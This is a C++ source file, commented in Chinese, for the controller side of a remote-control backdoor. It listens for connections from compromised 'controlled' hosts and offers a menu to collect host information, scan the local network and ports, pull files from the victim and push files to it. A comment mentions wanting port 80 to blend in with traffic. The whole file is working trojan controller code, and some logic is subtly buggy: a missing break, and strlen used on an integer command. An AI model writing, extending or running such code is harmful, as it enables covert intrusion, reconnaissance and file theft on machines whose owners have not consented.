/*******控制端程序**********/
#include "client.h"

#define LISTEN_PORT 8000 //监听端口8000(应该为80,但是端口复用技术还未掌握)
#define BUFFLEN 1024
#define BACKLOG 10 //监听队列
int menu(int sock,struct sockaddr *dest);
int Disconnect(int sock,struct sockaddr *dest);
int FileSend(int sock,struct sockaddr *dest);
int FileRecv(int sock,struct sockaddr *dest);
void SendCmd(int cmd,int sock,struct sockaddr *dest);
int GetLocalInfo(int sock,struct sockaddr *dest);
int ScanTcpPort(int sock,struct sockaddr *dest);
int ScanUdpPort(int sock,struct sockaddr *dest);
void DataRecv(int sock,struct sockaddr *dest);
int ScanIpAndMac(int sock,struct sockaddr *dest);

using namespace std;

int main(int argc,char **argv)
{
	int sockfd;
	struct sockaddr_in local;

	sockfd = socket(AF_INET,SOCK_STREAM,0);

	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 200000; //200ms
	if(setsockopt(sockfd,SOL_SOCKET,SO_SNDTIMEO,&tv,sizeof(tv))==-1)
	{
		cout<<"设置发送超时时间失败！"<<endl;
		return -1;
	}
	if(setsockopt(sockfd,SOL_SOCKET,SO_RCVTIMEO,&tv,sizeof(tv))==-1)
    {
        cout<<"设置接收超时时间失败！"<<endl;
        return -1;
	}	

	bzero(&local,sizeof(local));
	local.sin_family = AF_INET;
	local.sin_addr.s_addr = htonl(INADDR_ANY);
	local.sin_port = htons(LISTEN_PORT);
	
	/*套接字绑定本地地址和端口*/
	bind(sockfd,(struct sockaddr *)&local,sizeof(local));
	listen(sockfd,BACKLOG);

	/*等待处理客户端的连接*/
	handle_connect(sockfd);

	close(sockfd);
	return 0;
}

int handle_connect(int sockfd)
{
	int s_c;
	struct sockaddr from;
	socklen_t len = sizeof(from);

	while(1)
	{
		/*接收被控端的连接*/
		s_c = accept(sockfd,&from,&len);
		if(s_c > 0) /*客户端成功连接*/
		{
			/*创建进程进行处理*/
			if(fork() > 0)
				close(s_c);
			else
			{
				handle_request(s_c,&from);
				return 0;
			}
		}
	}
}

void handle_request(int s_c,struct sockaddr *dest)
{
	char recvbuff[BUFFLEN];
	memset(recvbuff,0,BUFFLEN);
	int n = 0;
	socklen_t from_len = sizeof(*dest);
	int ret = 0;
	int flag = 0;//跳出循环标志
	cout<< "被控端成功连接..." <<endl;
	n = recvfrom(s_c,recvbuff,BUFFLEN,0,dest,&from_len);
	if(n > 0 && !strcmp(recvbuff,"READY"))
	{
		cout << "被控端已经准备好..." <<endl;
		while(1)
		{
			ret = menu(s_c,dest);
			if(ret == -1)
			{
				cout<<"欢迎再次使用..."<<endl;
				flag = 1;
				close(s_c);
			}			
			if(flag == 1)
				break;
		}
	}
}

/*菜单函数，提供控制命令，返回-1表示控制端异常，退出*/
int menu(int s,struct sockaddr *dest)
{
	int CMD;
	int sc = s;
	cout<<"***控制端操作选项***"<<endl;
	cout<<"100:关闭连接"<<endl;
	cout<<"101:获得主机信息"<<endl;
	cout<<"102:扫描局域网在线主机IP及MAC地址"<<endl;
	cout<<"103:扫描TCP端口"<<endl;
	cout<<"104:扫描UDP端口"<<endl;
	cout<<"105:控制端接收文件"<<endl;
	cout<<"106:控制端发送文件"<<endl;
	cout<<"107:扫描网络漏洞"<<endl;
	cout<<"请输入指令..."<<endl;
	cin>>CMD;

	switch(CMD)
	{
		case 100:
			cout<<"断开连接..."<<endl;
			Disconnect(sc,dest);return -1;
		case 101:
			cout<<"获取主机信息指令..."<<endl;
			GetLocalInfo(sc,dest);break;
		case 102:
			cout<<"扫描在线主机及其MAC地址..."<<endl;
			ScanIpAndMac(s,dest);break;
		case 103:
			cout<<"扫描TCP端口指令"<<endl;
			ScanTcpPort(s,dest);break;
		case 104:
			/*扫描UDP端口*/
		case 105:
			cout<<"接收文件指令..."<<endl;
			FileRecv(sc,dest);break;
		case 106:
			cout<<"发送文件指令..."<<endl;
			FileSend(sc,dest);break;
		case 107:
			/*扫描漏洞*/
		default:
			cout<<"错误命令"<<endl;
			cout<<"请输入正确命令！"<<endl;
			return 0;
	}
	return 0;
}
/*断开连接函数*/
int Disconnect(int s,struct sockaddr *dest)
{
	cout<<"控制端准备和被控端断开连接..."<<endl;
	SendCmd(100,s,dest);

	close(s);
	cout<<"已断开连接..."<<endl;
	return 0;
}
/*发送指令函数*/
void SendCmd(int cmd,int s,struct sockaddr *dest)
{
	char sendbuff[128];
	memset(sendbuff,0,128);
	memcpy(sendbuff,&cmd,sizeof(cmd));
	sendto(s,sendbuff,strlen(sendbuff),0,dest,sizeof(*dest));
}

/*接收数据函数*/
void DataRecv(int s,struct sockaddr *dest)
{
	char recvbuff[BUFFLEN];
	socklen_t len = sizeof(*dest);
	string filename;
	cout<<"请输入要接收的数据的文件名..."<<endl;
	cin>>filename;
	FILE *fp = fopen(filename.c_str(),"w+");//c_str()将string转换为char *
    int size = 0;
    memset(recvbuff,0,BUFFLEN);
    cout<<"开始接收数据..."<<endl;
    cout<<"正在接收数据中..."<<endl;
    while((size = recvfrom(s,recvbuff,BUFFLEN,0,dest,&len)) > 0)
    {
        if(fwrite(recvbuff,1,size,fp) < size)
        {
            cout<<"写文件失败！"<<endl;
            break;
        }
    }
    cout<<"数据接收完毕！"<<endl;
    fclose(fp);
//    close(s);

}
/*接收文件函数*/
int FileRecv(int s,struct sockaddr *dest)
{
	char recvbuff[BUFFLEN];
	socklen_t len = sizeof(*dest);
	cout<<"发送指令..."<<endl;
	SendCmd(105,s,dest);
	memset(recvbuff,0,BUFFLEN);
	recvfrom(s,recvbuff,BUFFLEN,0,dest,&len);
	if(!strcmp(recvbuff,"OK"))
	{
		cout<<"OK"<<endl;
	}
	else
		return -1;
	DataRecv(s,dest);

	return 0;
}

/*发送文件函数*/
int FileSend(int s,struct sockaddr *dest)
{
	char sendbuff[BUFFLEN];
	string FileName;
	socklen_t len = sizeof(*dest);
	SendCmd(106,s,dest);	
	cout<<"发送指令..."<<endl;
	memset(sendbuff,0,BUFFLEN);
	recvfrom(s,sendbuff,BUFFLEN,0,dest,&len);
	if(!strcmp(sendbuff,"OK"))
	{
		cout<<"OK"<<endl;
	}
	else
		return -1;
	
	cout<<"准备发送文件..."<<endl;
	memset(sendbuff,0,BUFFLEN);

	cout<<"请输入要发送的文件名..."<<endl;
	cin>>FileName;
	FILE *fp = fopen(FileName.c_str(),"r+"); //打开要发送的文件
	if(fp == NULL)
	{
		cout<<"文件："<<FileName<<"未找到"<<endl;
		return -1;
	}
	else
	{
		int size = 0;
		cout<<"文件正在传输..."<<endl;
		while((size = fread(sendbuff,1,BUFFLEN,fp)) > 0)
		{
			sendto(s,sendbuff,size,0,dest,sizeof(struct sockaddr_in));
		}
		cout<<"文件传输成功！"<<endl;
		bzero(sendbuff,BUFFLEN);
	}
	fclose(fp);
	//close(s);
}

/*扫描主机信息*/
int GetLocalInfo(int s,struct sockaddr *dest)
{
	cout<<"发送指令"<<endl;
	SendCmd(101,s,dest);

	DataRecv(s,dest);

    return 0;
}

/*发送扫描TCP端口的指令*/
int ScanTcpPort(int s,struct sockaddr *dest)
{
	cout<<"发送扫描TCP端口指令"<<endl;
	SendCmd(103,s,dest);

	/*使用select函数监视文件描述符s，两分钟内若控制端发回数据则读取，否则错误*/
	fd_set fd;
	struct timeval tv;
	tv.tv_sec = 120;//120秒
	tv.tv_usec = 0;
	FD_ZERO(&fd);	//清空文件描述符集合
	FD_SET(s,&fd);	//添加描述符
	int maxfd = s + 1;
	int ret = 0;
	ret = select(maxfd,&fd,NULL,NULL,&tv);//两分钟有可读数据则返回1
	if(ret <= 0)
	{
		cout<<"超时或出现错误！未检测到有可读数据！"<<endl;
		return -1;
	}
	DataRecv(s,dest);
	
	return 0;	
}

/*发送扫描在线主机及其MAC地址的指令*/
int ScanIpAndMac(int s,struct sockaddr *dest)
{
	cout<<"发送扫描在线主机及其MAC地址指令"<<endl;
	SendCmd(102,s,dest);

	DataRecv(s,dest);

	return 0;
}
